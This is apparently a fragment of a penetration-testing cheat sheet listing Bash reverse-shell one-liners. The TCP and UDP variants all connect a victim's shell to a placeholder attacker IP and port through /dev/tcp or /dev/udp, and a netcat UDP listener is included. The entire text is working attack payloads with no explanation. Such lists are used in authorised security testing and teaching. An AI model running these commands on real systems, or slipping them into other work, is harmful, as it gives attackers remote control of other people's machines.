#### Bash TCP

```bash
bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1

0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0<&1 2>&1
```

#### Bash UDP

```bash
Victim:
sh -i >& /dev/udp/$ATTACKER_IP/$ATTACKER_PORT 0>&1

Listener:
nc -u -lvp $ATTACKER_PORT
```